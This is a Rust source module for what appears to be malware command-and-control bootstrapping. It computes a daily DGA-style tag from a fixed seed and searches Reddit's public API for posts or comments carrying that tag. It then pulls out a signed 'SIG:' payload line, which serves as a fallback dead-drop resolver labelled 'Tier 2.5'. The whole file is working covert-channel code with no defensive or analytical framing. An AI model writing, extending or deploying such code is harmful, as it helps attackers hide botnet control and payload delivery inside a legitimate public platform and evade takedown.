use async_trait::async_trait;
use reqwest::Client;
use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use log::debug;
use serde::Deserialize;
use super::BootstrapProvider;

/// Reddit Backup Provider (Tier 2.5)
/// Searches for DGA-derived tags on Reddit comments/posts
pub struct RedditProvider;

impl RedditProvider {
    fn generate_tag(&self) -> String {
        let start = SystemTime::now();
        let seconds = start.duration_since(UNIX_EPOCH).unwrap().as_secs();
        let day_slot = seconds / 86400;
        
        let seed: u64 = 0xCAFEBABE;
        let mut state = day_slot ^ seed;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        // Tag format: "phantom-{hex}" (same seed as DGA but different usage)
        format!("phantom-{:x}", state & 0xFFFF) 
    }
}

#[derive(Deserialize)]
struct RedditListing {
    data: RedditData,
}

#[derive(Deserialize)]
struct RedditData {
    children: Vec<RedditChild>,
}

#[derive(Deserialize)]
struct RedditChild {
    data: RedditContent,
}

#[derive(Deserialize)]
struct RedditContent {
    selftext: Option<String>, // For posts
    body: Option<String>,     // For comments
}

#[async_trait]
impl BootstrapProvider for RedditProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        let tag = self.generate_tag();
        debug!("[Bootstrap] Reddit Searching Tag: {}", tag);
        
        // Search for posts/comments containing the tag
        let url = format!("https://www.reddit.com/search.json?q={}&sort=new&limit=5", tag);
        
        // Reddit requires a unique User-Agent
        let resp = client.get(&url)
            .send()
            .await?
            .json::<RedditListing>()
            .await?;

        for child in resp.data.children {
            let content = child.data.selftext.or(child.data.body).unwrap_or_default();
            
            // Look for "SIG:..." pattern in the content
            if content.contains("SIG:") && content.contains("MSG:") {
                 // Extract valid payload if mixed with other text
                 for line in content.lines() {
                     if line.contains("SIG:") {
                         return Ok(line.trim().to_string());
                     }
                 }
            }
        }
        
        Err(format!("No signed payload found for tag {}", tag).into())
    }

    fn name(&self) -> String {
        "Reddit(Tier 2.5)".to_string()
    }
}
